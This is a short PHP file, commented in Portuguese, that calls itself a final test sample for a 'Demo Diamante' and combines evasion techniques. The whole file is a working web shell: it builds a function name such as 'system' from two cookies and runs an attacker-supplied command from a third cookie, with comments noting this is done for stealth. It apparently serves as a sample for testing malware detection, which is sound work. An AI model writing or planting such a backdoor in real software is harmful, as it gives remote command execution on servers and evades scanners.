<?php
// Amostra de teste final para a Demo Diamante.
// Combina múltiplas técnicas de evasão.

// O atacante controla a função e o comando através de cookies para ser mais furtivo.
if (isset($_COOKIE['f1']) && isset($_COOKIE['f2']) && isset($_COOKIE['c'])) {
    $parte1 = $_COOKIE['f1']; // ex: 'sys'
    $parte2 = $_COOKIE['f2']; // ex: 'tem'
    $cmd = $_COOKIE['c'];   // ex: 'ls -la'

    // A função perigosa é montada dinamicamente.
    $funcao_alvo = $parte1 . $parte2;
    
    // E executada a partir da variável.
    $funcao_alvo($cmd);
}
?>